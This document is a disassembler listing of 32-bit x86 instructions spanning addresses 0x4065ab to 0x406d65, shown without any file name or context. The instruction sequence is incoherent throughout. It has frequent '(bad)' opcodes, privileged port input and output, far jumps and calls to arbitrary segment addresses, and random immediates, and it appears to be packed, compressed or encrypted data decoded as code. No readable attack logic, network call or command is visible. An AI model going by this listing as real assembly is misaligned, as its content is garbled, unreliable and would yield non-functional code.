  4065ab:	es lahf 
  4065ad:	addr16 jmp 0x8b06:0xd30d5af9
  4065b5:	inc    esp
  4065b6:	cld    
  4065b7:	cld    
  4065b8:	lahf   
  4065b9:	push   ss
  4065ba:	add    BYTE PTR [ecx-0x10],ch
  4065bd:	mov    ah,BYTE PTR [ebx+edi*2-0x74]
  4065c1:	mov    ds:0xb190cf45,al
  4065c6:	aad    0xf0
  4065c8:	cli    
  4065c9:	inc    esp
  4065ca:	push   0xf32abed0
  4065cf:	into   
  4065d0:	enter  0x3226,0xe1
  4065d4:	fwait
  4065d5:	stc    
  4065d6:	loope  0x4065f8
  4065d8:	ret    0x5b98
  4065db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065dc:	mov    esi,0x35ea5529
  4065e1:	inc    eax
  4065e2:	sbb    DWORD PTR [esi+0x7b],edx
  4065e5:	jnp    0x40664e
  4065e7:	pop    es
  4065e8:	lods   al,BYTE PTR ds:[esi]
  4065e9:	stc    
  4065ea:	call   0xf1beff75
  4065ef:	pusha  
  4065f0:	sahf   
  4065f1:	xchg   edx,eax
  4065f2:	inc    eax
  4065f3:	pop    edx
  4065f4:	ror    DWORD PTR [ecx],cl
  4065f6:	and    eax,0xabe4ff2
  4065fb:	inc    ebp
  4065fc:	shl    dl,1
  4065fe:	xor    DWORD PTR [ebx],0xf1f2c21b
  406604:	add    edi,DWORD PTR [eax-0x2b]
  406607:	pop    ecx
  406608:	dec    eax
  406609:	std    
  40660a:	push   eax
  40660b:	fnstcw WORD PTR [edi+0x34dff11e]
  406611:	xchg   esp,eax
  406612:	arpl   WORD PTR [eax],bx
  406614:	mov    ecx,0x5da1631c
  406619:	lahf   
  40661a:	rcl    BYTE PTR [eax],1
  40661c:	add    ebp,DWORD PTR ss:[ecx-0x136e8226]
  406623:	pop    ss
  406624:	int    0x33
  406626:	in     eax,0x25
  406628:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406629:	repnz popf 
  40662b:	repnz and bl,ch
  40662e:	xchg   esi,eax
  40662f:	or     eax,0xa3593780
  406634:	(bad)  
  406635:	push   ecx
  406636:	clc    
  406637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406638:	or     eax,0x293bcb3f
  40663d:	daa    
  40663e:	sbb    BYTE PTR [esi-0x4d],0xe4
  406642:	mov    eax,0x1c31f6cf
  406647:	and    DWORD PTR [eax+0x5f8190b],eax
  40664d:	mov    bh,0xab
  40664f:	cmp    eax,0x22ed051a
  406654:	jbe    0x4066ab
  406656:	sub    DWORD PTR [ecx],0x48ee6ce8
  40665c:	xor    eax,0xb05820b7
  406661:	mov    esp,0x2b94c3be
  406666:	and    BYTE PTR [edx],0x8a
  406669:	retf   0x2381
  40666c:	jmp    0x4ad14b89
  406671:	repnz push ss
  406673:	cdq    
  406674:	add    al,0x5b
  406676:	jnp    0x4066bd
  406678:	xchg   esi,eax
  406679:	or     eax,DWORD PTR [ecx+0x57]
  40667c:	sbb    eax,ecx
  40667e:	loopne 0x4066a7
  406680:	into   
  406681:	js     0x40667c
  406683:	push   cs
  406684:	ficom  WORD PTR [ebp-0x72]
  406687:	xchg   ecx,eax
  406688:	cmp    ch,bh
  40668a:	out    0x0,al
  40668c:	jle    0x406670
  40668e:	loop   0x4066e1
  406690:	lea    esp,[edi+0x2]
  406693:	adc    bh,ah
  406695:	sub    al,0xcf
  406698:	dec    esi
  406699:	out    0x81,eax
  40669b:	pop    eax
  40669c:	and    BYTE PTR [edi+0x69],dh
  40669f:	jle    0x40663d
  4066a1:	fistp  QWORD PTR [esi]
  4066a3:	(bad)  
  4066a4:	xchg   esp,eax
  4066a5:	sub    cl,BYTE PTR [edx-0x4c]
  4066a8:	or     al,0xdd
  4066aa:	fsub   QWORD PTR ss:[esi+0x1ab7cd2e]
  4066b1:	shr    BYTE PTR [esi-0x45],0xb3
  4066b5:	jge    0x4066a6
  4066b7:	mov    ah,0x26
  4066b9:	fwait
  4066ba:	mov    edi,0xf1df9353
  4066bf:	shl    bh,cl
  4066c1:	aad    0xbf
  4066c3:	dec    edx
  4066c4:	jmp    0xd7a6ccf1
  4066c9:	xchg   BYTE PTR [ecx-0x3f257642],ah
  4066cf:	fs dec ebx
  4066d1:	mov    BYTE PTR [edi-0x7d],dl
  4066d4:	in     al,dx
  4066d5:	push   edi
  4066d6:	es sbb eax,0x4ff403cd
  4066dc:	sti    
  4066dd:	cmp    ebp,DWORD PTR [eax-0x61]
  4066e0:	cld    
  4066e1:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066e3:	jmp    0x406715
  4066e5:	data16 out 0x69,al
  4066e8:	adc    DWORD PTR [ebp+0x41],esi
  4066eb:	fnstenv [ebx]
  4066ed:	mov    dl,0x9c
  4066ef:	ss clc 
  4066f1:	mov    ds:0x6a3c2a2a,al
  4066f6:	(bad)  
  4066f7:	aad    0x5f
  4066f9:	mov    eax,0x61ec7c2e
  4066fe:	mov    ds:0xb6f22701,al
  406703:	add    al,0x54
  406705:	jo     0x40668f
  406707:	cmp    edx,0xb7269d95
  40670d:	ror    BYTE PTR [ecx],cl
  40670f:	cmp    esi,edx
  406711:	jge    0x4066f3
  406713:	dec    ecx
  406714:	jae    0x4066e8
  406716:	mov    DWORD PTR [edi-0x4f192fa2],esp
  40671c:	or     eax,0x54413025
  406721:	jmp    0xbff59877
  406726:	aad    0xc1
  406728:	add    eax,0x5c44458c
  40672d:	nop
  40672e:	(bad)  
  406730:	mov    ebp,0x454c7854
  406735:	lea    ecx,[ebp+0x3a]
  406738:	sub    BYTE PTR [esi],0x92
  40673b:	sbb    edx,DWORD PTR [ebx+0x46]
  40673e:	push   esi
  40673f:	push   esp
  406740:	adc    BYTE PTR [ecx-0x126475a8],0x78
  406747:	fcom   QWORD PTR [ecx]
  406749:	or     edi,esi
  40674b:	es push esp
  40674d:	or     ah,al
  40674f:	scas   eax,DWORD PTR es:[edi]
  406750:	shl    DWORD PTR [edx+edi*4],cl
  406753:	lods   eax,DWORD PTR ds:[esi]
  406754:	clc    
  406755:	dec    ebp
  406756:	jg     0x40676a
  406758:	jmp    0xdea5:0xe0b045
  40675f:	inc    esi
  406760:	mov    ds:0x51fae46a,al
  406765:	sbb    ecx,DWORD PTR [ecx]
  406767:	std    
  406768:	stos   BYTE PTR es:[edi],al
  406769:	test   BYTE PTR [eax-0x74],dl
  40676c:	xchg   ecx,eax
  40676d:	mov    ebp,0xf72d854d
  406772:	lods   al,BYTE PTR ds:[esi]
  406773:	icebp  
  406774:	adc    BYTE PTR [edx+0x29],dl
  406777:	jge    0x406762
  406779:	adc    ah,BYTE PTR [esi]
  40677b:	mov    DWORD PTR [esi],esp
  40677d:	push   esp
  40677e:	adc    al,0x86
  406780:	fs or  eax,0xed928a6a
  406786:	out    dx,al
  406787:	(bad)
  40678c:	mov    BYTE PTR [ebx+0x61dce164],cl
  406792:	cwde   
  406793:	cwde   
  406794:	(bad)  
  406795:	xor    BYTE PTR cs:[ecx],cl
  406798:	pop    edi
  406799:	lods   al,BYTE PTR ds:[esi]
  40679a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40679b:	mov    bl,0x2e
  40679d:	sub    DWORD PTR [ebx+0x53fe20db],ecx
  4067a3:	sbb    ebp,ebx
  4067a5:	in     al,dx
  4067a6:	sbb    BYTE PTR [ecx+0x26],0xdf
  4067aa:	(bad)  
  4067ac:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067ae:	and    DWORD PTR [ebx],ebx
  4067b0:	scas   al,BYTE PTR es:[edi]
  4067b1:	jmp    0xf535:0xace3a120
  4067b8:	scas   al,BYTE PTR es:[edi]
  4067b9:	push   0xfaa9635
  4067be:	aaa    
  4067bf:	test   al,0x86
  4067c1:	lods   al,BYTE PTR ds:[esi]
  4067c2:	push   esi
  4067c3:	out    0xcf,al
  4067c5:	inc    eax
  4067c6:	pop    es
  4067c7:	jmp    0x5f08:0x9fdb4c2c
  4067ce:	add    DWORD PTR [ebx],0x15d3a7de
  4067d4:	hlt    
  4067d5:	(bad)  
  4067d6:	outs   dx,DWORD PTR ds:[esi]
  4067d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067d8:	lds    esi,FWORD PTR [esi+0x56]
  4067db:	retf   0x1254
  4067de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067df:	popa   
  4067e0:	iret   
  4067e1:	inc    esi
  4067e2:	(bad)  
  4067e3:	sar    BYTE PTR [esi-0x78],1
  4067e6:	add    ch,BYTE PTR [ecx-0x3677158]
  4067ec:	scas   eax,DWORD PTR es:[edi]
  4067ed:	stc    
  4067ee:	mov    eax,ds:0x9fc4e976
  4067f3:	into   
  4067f4:	mov    BYTE PTR [edi],al
  4067f6:	xchg   ebx,eax
  4067f7:	sbb    edi,DWORD PTR [eax]
  4067f9:	sbb    bh,cl
  4067fb:	or     al,0x9
  4067fd:	icebp  
  4067fe:	leave  
  4067ff:	jb     0x406848
  406801:	mov    DWORD PTR [ebp+0x9983f9e],0x99ebe31c
  40680b:	test   eax,0xb7b40ed1
  406810:	pop    esi
  406811:	xchg   ebx,eax
  406812:	pcmpeqd mm5,mm5
  406815:	inc    esp
  406816:	sub    al,0x6d
  406818:	push   esi
  406819:	add    esp,DWORD PTR [esi]
  40681b:	or     edx,esi
  40681d:	out    dx,al
  40681e:	test   esi,0x91e80ea5
  406824:	or     al,0x59
  406826:	retw   
  406828:	or     DWORD PTR [ecx-0x1534522c],esi
  40682e:	add    ah,BYTE PTR [ecx-0x37]
  406831:	push   eax
  406832:	push   ecx
  406833:	gs dec edx
  406835:	mov    eax,ds:0x43d5214e
  40683a:	dec    BYTE PTR [edx+0x30]
  40683d:	adc    DWORD PTR [ebx-0x17],edx
  406840:	fdiv   DWORD PTR [esi-0x2e]
  406843:	and    al,0xdc
  406845:	jg     0x406830
  406847:	push   ecx
  406848:	xchg   esp,eax
  406849:	push   ecx
  40684a:	sbb    ah,BYTE PTR [ebp-0x60]
  40684d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40684e:	lahf   
  40684f:	ins    BYTE PTR es:[edi],dx
  406850:	sbb    edi,eax
  406852:	test   dl,bl
  406854:	adc    dl,al
  406856:	cdq    
  406857:	add    ah,cl
  406859:	(bad)  
  40685a:	jp     0x4068d8
  40685c:	mov    ah,0xff
  40685e:	inc    ecx
  40685f:	jg     0x40683f
  406861:	std    
  406862:	test   BYTE PTR [ebx+0x1eb237fe],bh
  406868:	jmp    0xea22:0xc382d0eb
  40686f:	(bad)  
  406872:	and    esi,0x71
  406875:	adc    eax,ebp
  406877:	sbb    al,0x16
  406879:	mov    ebx,0xeba7e96f
  40687e:	out    0x68,eax
  406880:	adc    BYTE PTR [edx-0x5b],ah
  406883:	mov    ch,0xde
  406885:	pop    es
  406886:	mov    ah,0xa0
  406888:	push   ds
  406889:	mov    eax,ds:0x36218cbc
  40688e:	xchg   edi,eax
  40688f:	push   edx
  406890:	add    al,0x5c
  406892:	rcr    DWORD PTR [edi+edi*2],1
  406895:	push   esp
  406896:	fcomp  QWORD PTR [ebx+0x57]
  406899:	mov    bh,BYTE PTR [ebx]
  40689b:	pop    ebx
  40689c:	pusha  
  40689d:	(bad)  
  40689e:	and    ah,cl
  4068a0:	or     al,al
  4068a2:	les    esi,FWORD PTR [ebx-0x54fae7a3]
  4068a8:	pop    esi
  4068a9:	sub    edx,DWORD PTR [esi+eiz*1]
  4068ac:	inc    esi
  4068ad:	lods   eax,DWORD PTR ds:[esi]
  4068ae:	shl    DWORD PTR [ebp+esi*2-0x35396a20],cl
  4068b5:	dec    ecx
  4068b6:	icebp  
  4068b7:	and    BYTE PTR [edi-0x10],dh
  4068ba:	pop    es
  4068bb:	stc    
  4068bc:	and    ebp,DWORD PTR [esi-0x2a068ff2]
  4068c2:	xor    BYTE PTR [edx+0x46c0b88a],dl
  4068c8:	(bad)  
  4068ca:	pop    ds
  4068cb:	ja     0x406945
  4068cd:	(bad)  
  4068ce:	je     0x4068b5
  4068d0:	mov    esi,0x26631e30
  4068d5:	mov    ?,WORD PTR [ebx-0x6b8f8ad7]
  4068db:	push   cs
  4068dc:	or     BYTE PTR [ecx+0x5c],bl
  4068df:	inc    ecx
  4068e0:	gs inc esp
  4068e2:	cmp    al,BYTE PTR [ecx+ebx*4]
  4068e5:	fs out dx,al
  4068e7:	jbe    0x406958
  4068e9:	enter  0xaff9,0xed
  4068ed:	jp     0x40688e
  4068ef:	jb     0x406924
  4068f1:	jb     0x4068ae
  4068f3:	pop    eax
  4068f4:	loopne 0x406939
  4068f6:	xchg   edi,eax
  4068f7:	push   eax
  4068f8:	xor    dl,BYTE PTR [eax]
  4068fa:	lock mov ds:0x1b984f90,eax
  406900:	mov    bh,0x1a
  406902:	sti    
  406903:	pop    esi
  406904:	xchg   esi,eax
  406905:	xchg   ecx,edi
  406907:	or     BYTE PTR cs:[ecx-0x19eb1231],al
  40690e:	mov    edx,0x1bb3297a
  406913:	pop    es
  406914:	ret    
  406915:	pop    ss
  406916:	repz push ecx
  406918:	push   ss
  406919:	leave  
  40691a:	test   dl,bl
  40691c:	add    al,0xd5
  40691e:	push   0xc78c2abc
  406923:	retf   0x4e10
  406926:	cld    
  406927:	call   0xb468:0xea26c341
  40692e:	jno    0x4068df
  406930:	add    al,0xac
  406932:	sbb    BYTE PTR [esi],dh
  406934:	popa   
  406935:	sbb    ch,BYTE PTR [ebx]
  406937:	adc    eax,0x3701a30b
  40693c:	in     eax,dx
  40693d:	icebp  
  40693e:	(bad)  
  40693f:	out    dx,eax
  406940:	stc    
  406941:	jne    0x4068d4
  406943:	test   eax,0xbfb317d9
  406948:	push   ss
  406949:	pop    edx
  40694a:	mov    al,ds:0x2ccc9d58
  40694f:	ds push esp
  406951:	cwde   
  406952:	sar    edi,1
  406954:	hlt    
  406955:	popf   
  406956:	cli    
  406957:	retf   
  406958:	jne    0x406950
  40695a:	ins    BYTE PTR es:[edi],dx
  40695b:	aad    0xa3
  40695d:	outs   dx,DWORD PTR ds:[esi]
  40695e:	sti    
  40695f:	mov    ss,WORD PTR [ebx+0x5c]
  406962:	mov    ds:0x87c1aeb,eax
  406967:	add    esp,esi
  406969:	jge    0x4068f9
  40696b:	mov    DWORD PTR [edi],ecx
  40696d:	inc    eax
  40696e:	ret    
  40696f:	xchg   esi,eax
  406970:	icebp  
  406971:	cmp    eax,0xbd6a6c10
  406976:	jmp    0xf7cb:0xb175d2c4
  40697d:	xchg   ebp,eax
  40697e:	mov    edx,0xeb84f027
  406983:	push   edi
  406984:	sub    BYTE PTR [edx-0x51c62c2b],cl
  40698a:	popa   
  40698b:	jle    0x406975
  40698d:	in     al,0xce
  40698f:	(bad)  
  406990:	lock cs mov esp,0xab6987e9
  406997:	mov    DWORD PTR ds:0x630ff544,ebp
  40699d:	loop   0x4069c8
  40699f:	jnp    0x40695f
  4069a1:	jb     0x4069ef
  4069a3:	dec    edi
  4069a4:	sbb    ch,BYTE PTR [esp+edi*1-0x28]
  4069a8:	xchg   ecx,eax
  4069a9:	pop    edx
  4069aa:	out    dx,eax
  4069ab:	imul   esi,DWORD PTR [ebx],0x91df8004
  4069b1:	stos   DWORD PTR es:[edi],eax
  4069b2:	mov    ch,0x40
  4069b4:	aaa    
  4069b5:	ret    
  4069b6:	(bad)  
  4069b7:	ins    DWORD PTR es:[edi],dx
  4069b8:	addr16 es mov dh,0xdc
  4069bc:	in     eax,0x36
  4069be:	mov    BYTE PTR [eax],bl
  4069c0:	imul   eax,DWORD PTR [ebx-0x62a660a5],0xa79ddd50
  4069ca:	or     BYTE PTR [esi-0x69a6d5de],al
  4069d0:	adc    ebx,DWORD PTR [ebx+eiz*4-0x44]
  4069d4:	pop    ecx
  4069d5:	call   0xe9c0:0x3230669e
  4069dc:	jno    0x406964
  4069de:	or     eax,0x7773a9ca
  4069e3:	sbb    al,0x4c
  4069e5:	adc    al,0x50
  4069e7:	push   ds
  4069e8:	cli    
  4069e9:	or     ch,BYTE PTR [ebp+0x34c66c60]
  4069ef:	ret    
  4069f0:	sub    edx,esi
  4069f2:	mov    bh,0xd
  4069f4:	inc    eax
  4069f5:	(bad)  
  4069f6:	in     eax,0xc3
  4069f8:	xchg   ebx,eax
  4069f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069fa:	sbb    BYTE PTR [eax-0xd],al
  4069fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069fe:	jbe    0x406a2c
  406a00:	dec    ebx
  406a01:	stos   DWORD PTR es:[edi],eax
  406a02:	shr    DWORD PTR [ecx],cl
  406a04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a05:	sub    eax,0x10ce8ad
  406a0a:	mov    ah,0x56
  406a0c:	add    esi,DWORD PTR [ebx]
  406a0e:	or     bh,BYTE PTR [edx+ecx*1-0x7c]
  406a12:	enter  0x6106,0x15
  406a16:	retf   0x7ea0
  406a19:	retf   0x841b
  406a1c:	lock pusha 
  406a1e:	dec    esi
  406a1f:	push   es
  406a20:	pop    esp
  406a21:	call   0x1ab1:0x914b040f
  406a28:	mov    cl,0xfc
  406a2a:	popa   
  406a2b:	mov    edx,0x66a0c913
  406a30:	mov    dl,0xf7
  406a32:	sbb    ebp,ebx
  406a34:	sub    esp,DWORD PTR [eax-0x64]
  406a37:	int    0x6c
  406a39:	sahf   
  406a3a:	fbld   TBYTE PTR [ecx+0xcc2fbcb]
  406a40:	add    bl,BYTE PTR [edx-0x443a77b1]
  406a46:	cwde   
  406a47:	arpl   WORD PTR [ecx],bp
  406a49:	fnop   
  406a4b:	arpl   WORD PTR [ebp+eiz*1+0x254f5e5d],di
  406a52:	loop   0x406a41
  406a54:	pop    es
  406a55:	enter  0xd7c3,0xd7
  406a59:	dec    esp
  406a5a:	sub    al,0xfe
  406a5c:	stos   BYTE PTR es:[edi],al
  406a5d:	and    al,0x12
  406a5f:	pusha  
  406a60:	in     al,dx
  406a61:	adc    al,0x8a
  406a63:	dec    DWORD PTR [eax+ebp*8]
  406a66:	adc    DWORD PTR ds:0x2bba89f4,ecx
  406a6c:	sub    DWORD PTR ds:0x5a2cae5a,0x6e
  406a73:	dec    edi
  406a74:	ja     0x406ac4
  406a76:	loopne 0x406a83
  406a78:	aam    0xe1
  406a7a:	jmp    0x4cc13a94
  406a7f:	shl    dh,1
  406a81:	adc    BYTE PTR [ebx],bh
  406a83:	mov    ebp,0xda99a5fd
  406a88:	fimul  WORD PTR [ebp+0x47d6803b]
  406a8e:	loop   0x406aed
  406a90:	jae    0x406a2b
  406a92:	xlat   BYTE PTR ds:[ebx]
  406a93:	and    bh,BYTE PTR [ebx+0xfadd7a7]
  406a99:	push   esi
  406a9a:	adc    dl,BYTE PTR [edi]
  406a9c:	xchg   edi,eax
  406a9d:	mov    ebp,0xb3ed36c0
  406aa2:	sub    eax,0x739a6dfa
  406aa7:	jg     0x406a66
  406aa9:	jbe    0x406a96
  406aab:	fs push ss
  406aad:	xor    BYTE PTR [eax],bh
  406aaf:	cmp    DWORD PTR [ebx-0x63299ff3],esi
  406ab5:	pushf  
  406ab6:	data16 (bad) 
  406ab8:	lea    edi,[ebx+eax*8+0x449868c1]
  406abf:	sti    
  406ac0:	jle    0x406a95
  406ac2:	cld    
  406ac3:	cdq    
  406ac4:	xchg   edi,eax
  406ac5:	cmp    eax,0x106dc72
  406aca:	push   ds
  406acb:	jne    0x406ae1
  406acd:	dec    esp
  406ace:	pop    ds
  406acf:	inc    ebx
  406ad0:	cs popa 
  406ad2:	shr    DWORD PTR [ebx+edx*8-0x3f],1
  406ad6:	test   eax,0xe88ade2e
  406adb:	scas   al,BYTE PTR es:[edi]
  406adc:	leave  
  406add:	outs   dx,DWORD PTR ds:[esi]
  406ade:	jl     0x406b01
  406ae0:	shl    BYTE PTR [ecx-0x51ae79c0],0x87
  406ae7:	repz in al,0xde
  406aea:	cmp    eax,DWORD PTR [esp+esi*2-0x60cd1896]
  406af1:	push   esp
  406af2:	dec    esi
  406af3:	imul   esp,DWORD PTR [ebx-0x11b56d5f],0xc60ffcf8
  406afd:	push   ss
  406afe:	mov    ebp,0xd07b18a9
  406b03:	repnz in eax,0x35
  406b06:	addr16 pop esi
  406b08:	adc    DWORD PTR [ecx+0x1f6978e],esp
  406b0e:	mov    eax,0xd6ef1304
  406b13:	sub    ch,bl
  406b15:	push   ebx
  406b16:	jl     0x406ae0
  406b18:	mov    BYTE PTR [ecx+0x75add382],ch
  406b1e:	xchg   edi,eax
  406b1f:	cmp    eax,0xeaf714e0
  406b24:	xor    edi,eax
  406b26:	push   esp
  406b27:	push   cs
  406b28:	xchg   edx,eax
  406b29:	sbb    al,0x5d
  406b2b:	add    dl,BYTE PTR [ebx]
  406b2d:	xchg   esi,eax
  406b2e:	ins    DWORD PTR es:[edi],dx
  406b2f:	retf   
  406b30:	in     al,0x6e
  406b32:	dec    esp
  406b33:	sub    ebx,DWORD PTR [ebp+0x45]
  406b36:	js     0x406ae3
  406b38:	sub    DWORD PTR ds:0x2be2d0db,edi
  406b3e:	xchg   esp,eax
  406b3f:	rol    BYTE PTR [ecx-0x35],cl
  406b42:	sub    al,0xb3
  406b44:	je     0x406b9f
  406b46:	push   ecx
  406b47:	sub    ecx,DWORD PTR [ecx]
  406b49:	stc    
  406b4a:	popf   
  406b4b:	xor    eax,0xd3ce5438
  406b50:	rcr    BYTE PTR [esi-0xb13e7f1],1
  406b56:	or     BYTE PTR [edx+0x0],bl
  406b59:	cmp    bl,dl
  406b5b:	pop    edi
  406b5c:	mov    dl,0x81
  406b5e:	fstp   TBYTE PTR [ecx]
  406b60:	cmp    al,0x6d
  406b62:	mov    edi,DWORD PTR ds:0x5868c392
  406b68:	and    al,0x10
  406b6a:	repz jge 0x406b4b
  406b6d:	xchg   ecx,eax
  406b6e:	cld    
  406b6f:	aam    0xe5
  406b71:	mov    es,eax
  406b73:	mov    ecx,0x4d1e283e
  406b78:	out    dx,al
  406b79:	dec    esi
  406b7a:	mov    al,0xdb
  406b7c:	jl     0x406b94
  406b7e:	enter  0xb722,0x42
  406b82:	sub    BYTE PTR ds:0xf18c4496,ch
  406b88:	cmp    BYTE PTR [eax-0x77],al
  406b8b:	dec    eax
  406b8c:	push   ss
  406b8d:	push   ds
  406b8e:	mov    ecx,0x6e723aed
  406b93:	scas   eax,DWORD PTR es:[edi]
  406b94:	and    al,0x75
  406b96:	cdq    
  406b97:	mov    bh,0xb8
  406b99:	outs   dx,DWORD PTR ds:[esi]
  406b9a:	jecxz  0x406b53
  406b9c:	in     al,dx
  406b9d:	inc    edi
  406b9e:	mov    esi,0x547847f7
  406ba3:	add    ebp,0x76ef991c
  406ba9:	xor    bl,BYTE PTR [edx]
  406bab:	push   0x60
  406bad:	xchg   ecx,eax
  406bae:	fs int3 
  406bb0:	xor    dl,BYTE PTR [edi+0x71]
  406bb3:	mov    dl,0x8b
  406bb5:	dec    edi
  406bb6:	adc    al,0x51
  406bb8:	and    BYTE PTR [ebx+ecx*2-0x3f],0xf6
  406bbd:	jge    0x406c17
  406bbf:	mov    ss,WORD PTR [ecx+ecx*2+0x38]
  406bc3:	jo     0x406b73
  406bc5:	call   0xec3ff55d
  406bca:	sti    
  406bcb:	inc    ecx
  406bcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bcd:	frstorw [ecx]
  406bd0:	push   ds
  406bd1:	gs jmp 0x572f:0x5fcc92a
  406bd9:	cmp    al,0xbe
  406bdb:	stos   BYTE PTR es:[edi],al
  406bdc:	inc    esi
  406bdd:	int3   
  406bde:	shl    ebx,0xeb
  406be1:	sti    
  406be2:	push   ss
  406be3:	pop    edi
  406be4:	mov    dl,0x1
  406be6:	mov    esp,0x630b782
  406beb:	test   al,0x47
  406bed:	call   0x1e45:0xb631daaf
  406bf4:	sbb    eax,0x8fcbdaea
  406bf9:	ret    
  406bfa:	pop    ds
  406bfb:	pop    ds
  406bfc:	mov    bh,0x7b
  406bfe:	push   esi
  406bff:	popf   
  406c00:	ret    0xb629
  406c03:	std    
  406c04:	inc    ebp
  406c05:	jle    0x406ba8
  406c07:	cs ja  0x406c59
  406c0a:	(bad)  
  406c0b:	fs out 0x66,eax
  406c0e:	repnz dec esi
  406c10:	clc    
  406c11:	stc    
  406c12:	test   al,0xf6
  406c14:	inc    esp
  406c15:	inc    edx
  406c16:	popa   
  406c17:	dec    ebx
  406c18:	sub    al,0x8e
  406c1a:	xchg   edx,eax
  406c1b:	push   eax
  406c1c:	mov    al,0x62
  406c1e:	push   es
  406c1f:	jbe    0x406bbc
  406c21:	push   ebp
  406c22:	gs pop esi
  406c24:	mov    ah,0x4f
  406c26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c27:	and    DWORD PTR [esp+edx*2-0x36689e8],0xd4a2a239
  406c32:	fwait
  406c33:	or     eax,0x84f0405e
  406c38:	mov    al,0xce
  406c3a:	int    0xf0
  406c3c:	data16 mov bl,0xa3
  406c3f:	pusha  
  406c40:	add    BYTE PTR [edx-0x2b],dh
  406c43:	adc    DWORD PTR [edi-0x30d1b291],0x50
  406c4a:	or     edi,esi
  406c4c:	enter  0xbe1e,0xe4
  406c50:	adc    ecx,DWORD PTR [ebp+eiz*2-0x49e81074]
  406c57:	cmp    al,0xf3
  406c59:	aas    
  406c5a:	adc    dh,BYTE PTR [eax]
  406c5c:	scas   eax,DWORD PTR es:[edi]
  406c5d:	mov    bl,0x23
  406c5f:	lods   eax,DWORD PTR ds:[esi]
  406c60:	or     esi,DWORD PTR [eax]
  406c62:	in     al,0xfe
  406c64:	sub    eax,0x81ae89ff
  406c69:	cmp    dh,BYTE PTR [eax-0x3f]
  406c6c:	mov    ss,WORD PTR [ecx-0x2850cafe]
  406c72:	inc    ebx
  406c73:	aam    0x79
  406c75:	cwde   
  406c76:	shl    BYTE PTR fs:[esi],1
  406c79:	std    
  406c7a:	add    ch,BYTE PTR [edx]
  406c7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c7d:	gs das 
  406c7f:	mov    al,ds:0x7253dca3
  406c84:	lea    ecx,[ebx+0x34]
  406c87:	xlat   BYTE PTR ds:[ebx]
  406c88:	fisub  DWORD PTR [edx]
  406c8a:	(bad)  
  406c8b:	xchg   esi,eax
  406c8c:	push   cs
  406c8d:	push   ebx
  406c8e:	cmp    bl,BYTE PTR [ebp-0x40928460]
  406c94:	xchg   esi,eax
  406c95:	push   edx
  406c96:	sub    dh,0xbb
  406c99:	mov    ch,0x32
  406c9b:	clc    
  406c9c:	hlt    
  406c9d:	es pop ebx
  406c9f:	mov    al,ds:0x96ae20ef
  406ca4:	pop    ds
  406ca5:	in     al,dx
  406ca6:	addr16 dec esp
  406ca8:	cmp    ch,BYTE PTR [ebx-0x38]
  406cab:	sub    bh,BYTE PTR [esp+edx*4]
  406cae:	dec    esi
  406caf:	inc    ebx
  406cb0:	xor    ebp,DWORD PTR [ebp-0x64]
  406cb3:	stos   DWORD PTR es:[edi],eax
  406cb4:	ret    
  406cb5:	mov    eax,0x4cd3916c
  406cba:	aam    0x33
  406cbc:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cbe:	sub    BYTE PTR [ebx+0x4a],bl
  406cc1:	jmp    0x6903:0x168c9261
  406cc8:	sar    BYTE PTR [ebx+0x59ac4515],cl
  406cce:	ret    0x76da
  406cd1:	in     al,dx
  406cd2:	sahf   
  406cd3:	adc    WORD PTR fs:[ecx-0x15],bx
  406cd8:	or     DWORD PTR [ebx+0x1e],ebx
  406cdb:	(bad)  
  406cdc:	fs popf 
  406cde:	mov    eax,0x1323a81a
  406ce3:	sub    BYTE PTR [esi-0x5c],dh
  406ce6:	pop    ebp
  406ce7:	mov    dh,0xec
  406ce9:	dec    ecx
  406cea:	mov    BYTE PTR [eax],0x39
  406ced:	repnz xchg esp,eax
  406cef:	sti    
  406cf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cf1:	daa    
  406cf2:	pop    ss
  406cf3:	dec    edi
  406cf4:	out    0x3e,al
  406cf6:	(bad)  
  406cf8:	jns    0x406d6a
  406cfa:	loopne 0x406d58
  406cfc:	xor    eax,0x9a056ebe
  406d01:	cmp    DWORD PTR [eax-0x75c026e0],ecx
  406d07:	cld    
  406d08:	mov    dh,0xfd
  406d0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d0b:	dec    ebp
  406d0c:	push   cs
  406d0d:	(bad)  
  406d0e:	ss ret 0x750c
  406d12:	fst    DWORD PTR [ebx+0x73201637]
  406d18:	out    0x45,eax
  406d1a:	cwde   
  406d1b:	push   ebx
  406d1c:	push   ds
  406d1d:	jmp    0xac77:0xf9919bb9
  406d24:	dec    ebp
  406d25:	(bad)  
  406d26:	jmp    0x2d5c:0x768dbe94
  406d2d:	out    0xaa,eax
  406d2f:	xchg   BYTE PTR [ecx*4+0x7d34a8dc],dh
  406d36:	shr    esp,1
  406d38:	out    dx,al
  406d39:	imul   DWORD PTR [esp+eiz*4+0x2]
  406d3d:	test   ah,0x57
  406d40:	cs or  eax,0x909f2d0c
  406d46:	sub    al,0xa4
  406d48:	lds    ebx,FWORD PTR [ecx]
  406d4a:	push   cs
  406d4b:	iret   
  406d4c:	mov    eax,ds:0x61a528cb
  406d51:	aam    0x52
  406d53:	imul   ebx,eax,0x6c
  406d56:	jmp    0x6fdd59b
  406d5b:	push   eax
  406d5c:	clc    
  406d5d:	adc    bl,0x99
  406d60:	aas    
  406d61:	dec    ebp
  406d62:	adc    al,BYTE PTR [edx-0x6c]
  406d65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
